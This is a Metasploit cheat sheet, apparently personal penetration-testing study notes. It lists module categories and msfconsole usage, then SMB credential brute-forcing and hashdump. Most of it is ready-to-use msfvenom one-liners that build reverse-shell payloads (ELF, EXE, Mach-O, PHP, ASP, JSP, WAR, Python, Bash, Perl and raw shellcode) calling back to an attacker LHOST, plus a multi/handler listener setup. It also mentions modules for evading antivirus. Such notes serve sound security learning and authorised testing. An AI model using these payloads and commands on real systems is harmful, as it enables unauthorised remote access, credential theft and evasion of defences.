# Metasploit [link](https://netsec.ws/?p=331)

- Exploit
    - A piece of code that uses a vulnerability present on the target system.

- Vulnerability
    - A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.

- Payload
    - An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.



**Auxiliary**: Any supporting module, such as scanners, crawlers and fuzzers, can be found here.
```
┌──(kali㉿kali)-[~]
└─$ tree -L 1 /usr/share/metasploit-framework/modules/auxiliary
/usr/share/metasploit-framework/modules/auxiliary
├── admin
├── analyze
├── bnat
├── client
├── cloud
├── crawler
├── docx
├── dos
├── example.py
├── example.rb
├── fileformat
├── fuzzers
├── gather
├── parser
├── pdf
├── scanner
├── server
├── sniffer
├── spoof
├── sqli
├── voip
└── vsploit
```

**Encoders**: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.
```
┌──(kali㉿kali)-[~]
└─$ tree -L 1 /usr/share/metasploit-framework/modules/encoders 
/usr/share/metasploit-framework/modules/encoders
├── cmd
├── generic
├── mipsbe
├── mipsle
├── php
├── ppc
├── ruby
├── sparc
├── x64
└── x86
```

**Evasion**: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. 
```
┌──(kali㉿kali)-[~]
└─$ tree -L 2 /usr/share/metasploit-framework/modules/evasion
/usr/share/metasploit-framework/modules/evasion
└── windows
    ├── applocker_evasion_install_util.rb
    ├── applocker_evasion_msbuild.rb
    ├── applocker_evasion_presentationhost.rb
    ├── applocker_evasion_regasm_regsvcs.rb
    ├── applocker_evasion_workflow_compiler.rb
    ├── process_herpaderping.rb
    ├── syscall_inject.rb
    ├── windows_defender_exe.rb
    └── windows_defender_js_hta.rb
```


**Exploits**: Exploits, neatly organized by target system.
```
┌──(kali㉿kali)-[~]
└─$ tree -L 1 /usr/share/metasploit-framework/modules/exploits
/usr/share/metasploit-framework/modules/exploits
├── aix
├── android
├── apple_ios
├── bsd
├── bsdi
├── dialup
├── example_linux_priv_esc.rb
├── example.py
├── example.rb
├── example_webapp.rb
├── firefox
├── freebsd
├── hpux
├── irix
├── linux
├── mainframe
├── multi
├── netware
├── openbsd
├── osx
├── qnx
├── solaris
├── unix
└── windows
```

**Payloads**: Payloads are codes that will run on the target system.
```
┌──(kali㉿kali)-[~]
└─$ tree -L 1 /usr/share/metasploit-framework/modules/payloads
/usr/share/metasploit-framework/modules/payloads
├── singles
├── stagers
└── stages
```

- **Singles**: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
- **Stagers**: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
- **Stages**: Downloaded by the stager. This will allow you to use larger sized payloads.


**Post**: Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.
```
┌──(kali㉿kali)-[~]
└─$ tree -L 1 /usr/share/metasploit-framework/modules/post    
/usr/share/metasploit-framework/modules/post
├── aix
├── android
├── apple_ios
├── bsd
├── firefox
├── hardware
├── linux
├── multi
├── networking
├── osx
├── solaris
└── windows
```

## MSFCONSOLE



sudo /etc/init.d/postgresql start
sudo msfdb init
sudo msfconsole

```
systemctl start postgresql
msfdb init
msfconsole
db_status
workspace
```

### workspace
- List
    workspace
- Add
    workspace -a teste
- Delete
    workspace -d teste
-Help
    workspace -h

## db_nmap
Run Nmap using the db_nmap so that all results are saved to the database. 
```
db_nmap -sV -p- 10.10.12.229
hosts
services
vulns
```

### command to set hosts in RHOSTS
```
hosts -R
```

### commands
- search
    - search type:auxiliary telnet
- use
    - use auxiliary/admin/smb/ms17_010_command
- info
- show (options / payloads)
- set
- setg (set globally)
- unset
- back
- ls
- history
- clear
- check
- exploit
- exploit -Z (exploit and background the session)
- background
- sessions
- sessions -i

## Port scanning
- search portscan

```
use auxiliary/scanner/portscan/tcp
show options
```

- CONCURRENCY: Number of targets to be scanned simultaneously.
- PORTS: Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.
- RHOSTS: Target or target network to be scanned.
- THREADS: Number of threads that will be used simultaneously. More threads will result in faster scans.

## UDP service Identification
```
use auxiliary/scanner/discovery/udp_sweep
```

## SMB Scans
```
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_version

use auxiliary/scanner/netbios/nbname 
```

```
use auxiliary/scanner/smb/smb_login
set SMBUser penny
set PASS_FILE wordlist.txt
exploit
```


NTLM Hash
- hashdump


## List payloads
```
msfvenom -l payloads
```

### Output formats
```
msfvenom --list formats
```


## Binaries

### Linux
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
```

### Windows
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
```

### Mac
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
```

## Web Payloads

### PHP
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

### ASP
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
```

### JSP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
```

### WAR
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```

## Scripting Payloads

### Python
```
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
```

### Bash
```
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
```

### Perl
```
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
```

## Shellcode

### Linux Based Shellcode
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

### Windows Based Shellcode
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

### Mac Based Shellcode
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

## Creating Metasploit Payloads
```
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z
```


## Post Suggester
run post/multi/recon/local_exploit_suggester
